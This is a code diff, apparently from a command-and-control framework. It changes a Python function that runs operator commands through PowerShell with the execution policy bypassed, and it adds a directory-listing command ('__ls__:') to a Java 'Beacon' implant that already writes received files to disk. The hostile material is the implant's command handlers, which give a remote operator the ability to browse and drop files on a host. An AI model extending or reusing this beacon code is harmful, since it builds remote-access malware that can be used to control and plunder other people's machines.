@@ -3656,10 +3656,10 @@ def run_command(cmd, task_id=None):
             try:
                 with open(_tps1, 'w', encoding='utf-8') as _bf:
                     _safe_cwd = _cwd.replace("'", "''")
-                    _bf.write("Set-Location '{}'\n{}\nWrite-Output ('__CWD__:' + (Get-Location).Path)\n".format(_safe_cwd, cmd))
+                    _bf.write("Set-Location '{}'\\n{}\\nWrite-Output ('__CWD__:' + (Get-Location).Path)\\n".format(_safe_cwd, cmd))
                 result = subprocess.run(
                     ['powershell.exe', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', _tps1],
-                    capture_output=True, text=True, timeout=60
+                    capture_output=True, text=True, timeout=60, encoding='utf-8', errors='replace'
                 )
             finally:
                 try: os.remove(_tps1)
@@ -4274,6 +4274,27 @@ public class Beacon {
                 Files.write(new File(dest).toPath(), data);
                 return "[+] " + filename + " \\u2192 " + dest + " (" + data.length + " bytes)";
             } catch (Exception e) { return "Error writing " + dest + ": " + e.getMessage(); }
+        }
+
+        if (cmd.startsWith("__ls__:")) {
+            String lsPath = cmd.length() > 7 ? cmd.substring(7).trim() : cwd;
+            if (lsPath.isEmpty()) lsPath = cwd;
+            File dir = new File(lsPath);
+            File[] entries = dir.listFiles();
+            if (entries == null) return "[]";
+            StringBuilder sb = new StringBuilder("[");
+            boolean first = true;
+            for (File f : entries) {
+                if (!first) sb.append(",");
+                first = false;
+                String t = f.isDirectory() ? "dir" : "file";
+                long sz = f.isFile() ? f.length() : 0L;
+                sb.append("{\"name\":\"").append(jsonEscape(f.getName()))
+                  .append("\",\"type\":\"").append(t)
+                  .append("\",\"size\":").append(sz).append("}");
+            }
+            sb.append("]");
+            return sb.toString();
         }
 
         // Shell command
